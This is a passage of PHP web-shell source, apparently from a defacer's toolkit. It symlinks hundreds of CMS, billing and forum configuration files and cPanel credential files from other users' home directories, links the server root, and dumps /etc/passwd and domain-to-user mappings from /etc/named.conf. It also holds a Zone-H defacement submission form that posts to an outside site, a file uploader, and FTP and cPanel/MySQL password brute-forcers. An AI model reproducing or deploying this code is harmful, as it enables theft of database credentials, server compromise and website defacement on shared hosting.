            @symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
            @symlink('/home3/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
            @symlink('/home3/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
            @symlink('/home3/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
            @symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
            @symlink('/home3/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
            @symlink('/home3/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
            @symlink('/home3/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
            @symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
            @symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
            @symlink('/home3/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
            @symlink('/home3/' . $user . '/public_html/home3/wp-config.php', $user . '-wp-home3.txt');
            @symlink('/home3/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
            @symlink('/home3/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
            @symlink('/home3/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
            @symlink('/home3/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
            @symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
            @symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
            @symlink('/home3/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
            @symlink('/home3/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
            @symlink('/home3/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
            @symlink('/home3/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
            @symlink('/home3/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
            @symlink('/home3/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
            @symlink('/home3/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
            @symlink('/home3/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
            @symlink('/home3/' . $user . '/public_html/home3/configuration.php', $user . '-joomla-home3.txt');
            @symlink('/home3/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
            @symlink('/home3/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
            @symlink('/home3/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
            @symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
            @symlink('/home3/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
            @symlink('/home3/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
            @symlink('/home3/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
            @symlink('/home3/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
            @symlink('/home3/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
            @symlink('/home3/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
            @symlink('/home3/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
            @symlink('/home3/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
            @symlink('/home3/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
            @symlink('/home3/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
            @symlink('/home3/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
            @symlink('/home3/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
            @symlink('/home3/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
            @symlink('/home3/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
            @symlink('/home3/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
            @symlink('/home3/' . $user . '/public_html/include/db.php', $user . '-7.txt');
            @symlink('/home3/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
            @symlink('/home3/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
            @symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
            @symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images.txt');
            @symlink('/home3/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
            @symlink('/home3/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
            @symlink('/home3/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
            @symlink('/home3/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
            @symlink('/home3/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
            @symlink('/home3/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
            @symlink('/home3/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
            @symlink('/home3/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
            @symlink('/home3/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
            @symlink('/home3/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
            @symlink('/home3/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
            @symlink('/home3/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
            @symlink('/home3/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
            @symlink('/home3/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
            @symlink('/home3/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
            @symlink('/home3/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
            @symlink('/home3/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/clientarea/configuration.php', $user . '-clientarea-WHMCS.txt');
            @symlink('/home3/' . $user . '/public_html/autobuy/configuration.php', $user . '-autobuy-WHMCS.txt');
            @symlink('/home4/' . $user . '/.my.cnf', $user . '-cpanel.txt');
            @symlink('/home4/' . $user . '/.accesshash', $user . '-WHM-accesshash.txt');
            @symlink('/home4/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
            @symlink('/home4/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
            @symlink('/home4/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
            @symlink('/home4/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
            @symlink('/home4/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
            @symlink('/home4/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
            @symlink('/home4/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
            @symlink('/home4/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
            @symlink('/home4/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
            @symlink('/home4/' . $user . '/public_html/config.inc.php', $user . '-amember2.txt');
            @symlink('/home4/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
            @symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images1.txt');
            @symlink('/home4/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
            @symlink('/home4/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
            @symlink('/home4/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
            @symlink('/home4/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
            @symlink('/home4/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
            @symlink('/home4/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
            @symlink('/home4/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
            @symlink('/home4/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
            @symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
            @symlink('/home4/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
            @symlink('/home4/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
            @symlink('/home4/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
            @symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
            @symlink('/home4/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
            @symlink('/home4/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
            @symlink('/home4/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
            @symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
            @symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
            @symlink('/home4/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
            @symlink('/home4/' . $user . '/public_html/home4/wp-config.php', $user . '-wp-home4.txt');
            @symlink('/home4/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
            @symlink('/home4/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
            @symlink('/home4/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
            @symlink('/home4/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
            @symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
            @symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
            @symlink('/home4/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
            @symlink('/home4/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
            @symlink('/home4/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
            @symlink('/home4/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
            @symlink('/home4/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
            @symlink('/home4/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
            @symlink('/home4/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
            @symlink('/home4/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
            @symlink('/home4/' . $user . '/public_html/home4/configuration.php', $user . '-joomla-home4.txt');
            @symlink('/home4/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
            @symlink('/home4/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
            @symlink('/home4/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
            @symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
            @symlink('/home4/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
            @symlink('/home4/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
            @symlink('/home4/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
            @symlink('/home4/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
            @symlink('/home4/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
            @symlink('/home4/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
            @symlink('/home4/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
            @symlink('/home4/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
            @symlink('/home4/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
            @symlink('/home4/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
            @symlink('/home4/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
            @symlink('/home4/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
            @symlink('/home4/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
            @symlink('/home4/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
            @symlink('/home4/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
            @symlink('/home4/' . $user . '/public_html/include/db.php', $user . '-7.txt');
            @symlink('/home4/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
            @symlink('/home4/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
            @symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
            @symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images.txt');
            @symlink('/home4/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
            @symlink('/home4/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
            @symlink('/home4/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
            @symlink('/home4/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
            @symlink('/home4/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
            @symlink('/home4/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
            @symlink('/home4/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
            @symlink('/home4/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
            @symlink('/home4/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
            @symlink('/home4/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
            @symlink('/home4/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
            @symlink('/home4/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
            @symlink('/home4/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
            @symlink('/home4/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
            @symlink('/home4/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
            @symlink('/home4/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
            @symlink('/home4/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/clientarea/configuration.php', $user . '-clientarea-WHMCS.txt');
            @symlink('/home4/' . $user . '/public_html/autobuy/configuration.php', $user . '-autobuy-WHMCS.txt');
            @symlink('/', 'btmgrab/root');
        }
        echo "<center><a href='btmgrab/root' target='_blank'><h1>Root</h1></a><br>
<br>
<center><a href='btmgrab' target='_blank'><h1>Configurations</h1></a><br>";
        echo "<title> Domains & Users</title>
     
     
    <p align=center> Domains & Users</p>
     
    <center>";
        $d0mains = @file("/etc/named.conf");
        if (!$d0mains) {
            die("<b> can't Read /etc/named.conf<br><br><br> Done");
        }
        echo "<table align=center border=1>
     
    <tr bgcolor=green><td>DOMAINS</td><td>USERs</td></tr>";
        foreach ($d0mains as $d0main) {
            if (eregi("zone", $d0main)) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
                    echo "<tr><td><a href=http://www." . $domains[1][0] . "/>" . $domains[1][0] . "</a></td><td>" . $user['name'] . "</td></tr>";
                    flush();
                }
            }
        }
        echo "</table>
     
    <p align='center'>
         
    </p>
     
    ";
    echo "<center>Done<br><br/>";
    } else {
        echo '<center>
<form method="POST">
<textarea name="passwd" style="width: 543px; height: 420px; background-color:transparent; font-family:Tahoma; font-size:8pt; ">';
        flush();
        $file = '/etc/passwd';
        $read = @fopen($file, 'r');
        if ($read) {
            $body = @fread($read, @filesize($file));
            echo "" . htmlentities($body) . "";
        } elseif (!$read) {
            $read = @show_source($file);
        } elseif (!$read) {
            $read = @highlight_file($file);
        } elseif (!$read) {
            for ($uid = 0;$uid < 1000;$uid++) {
                $ara = posix_getpwuid($uid);
                if (!empty($ara)) {
                    while (list($key, $val) = each($ara)) {
                        print "$val:";
                    }
                    print "
";
                }
            }
        }
        flush();
        echo '</textarea></br>
<p>&nbsp;</p><center>
<input name="m" size="80" value="Hajar" type="submit" style="width: 99; font-family:Tahoma; font-size:10pt;; text-transform:uppercase; height:23; background-color:#transparent"/></br>
</form>
';
    }

}
elseif($_GET['do'] == 'poster') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=defid'>Defacer-ID</a> </li>";
echo "<li> <a href='?dir=$dir&do=zoneh'>Zone-H</a> </li>";
echo "</ul>";
echo "</center>";
}
elseif($_GET['do'] == 'zoneh') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=defid'>Defacer-ID</a> </li>";
echo "<li> <a href='?dir=$dir&do=zoneh'>Zone-H</a> </li>";
echo "</ul>";
echo "</center>";
		if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<font style='text-decoration: underline;'>Zone-H Poster :</font><br>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Jingklong'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
}
elseif($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
} 
elseif($_GET['do'] == 'brut') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=cpc'>cPanel Bruteforce</a> </li>";
echo "<li> <a href='?dir=$dir&do=ftpb'>FTP Bruteforce</a> </li>";
echo "</ul>";
echo "</center>";
}	
elseif($_GET['do'] == 'ftpb') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=cpc'>cPanel Bruteforce</a> </li>";
echo "<li> <a href='?dir=$dir&do=ftpb'>FTP Bruteforce</a> </li>";
echo "</ul>";
echo "</center>";
		echo "
		<p align='center' dir='ltr'><font face='Tahoma' size='4'>[#] FTP Brute Force [#]</font></p>
		<form method='POST'>
		<center>
		<p dir='ltr'>
		<textarea style='width: 450px; height: 150px;' cols='30' rows='10' name='username' placeholder='username List'></textarea>
		<textarea style='width: 450px; height: 150px;' cols='30' rows='10' name='password' placeholder='Password List'></textarea></p>
		<input type='text' name='ip' value='127.0.0.1'>
		<input type='submit' value='BruteFTP' name='start'><br>
		<p><font face='Verdana' size='1'>[+] ReSulT [+]</font></p>
		</form>";
		@set_time_limit(0);
		$ip = $_POST['ip'];
		$username = explode("\n",$_POST['username']);
		$password = explode("\n",$_POST['password']);
			   
		if($_POST['start']) {
		function brute($connect,$ip,$user,$pass)
		{
		$connect = ftp_connect($ip) or die("Error , Maybe you were Banned From Server");
		if(ftp_login($connect, $user, $pass)) {
			echo "<p dir='ltr'><font face='Tahoma' size='2'>Cracked :
		<font color='#008000'>$user</font>:<font color='#008000'>$pass</font>@<font color='#008000'>$ip</font></font></p>"; }
		}
			   
		foreach($username as $user) {
		foreach($password as $pass) {
		brute($connect,$ip,$user,$pass);
		} }
		}
		echo "<p><font face='Verdana' size='1'>
		+------------------------------------------------------------------------------------------------------------+</font></p>
		</form>";

}
elseif($_GET['do'] == 'cpc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=cpc'>cPanel Bruteforce</a> </li>";
echo "<li> <a href='?dir=$dir&do=ftpb'>FTP Bruteforce</a> </li>";
echo "</ul>";
echo "</center>";
		if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
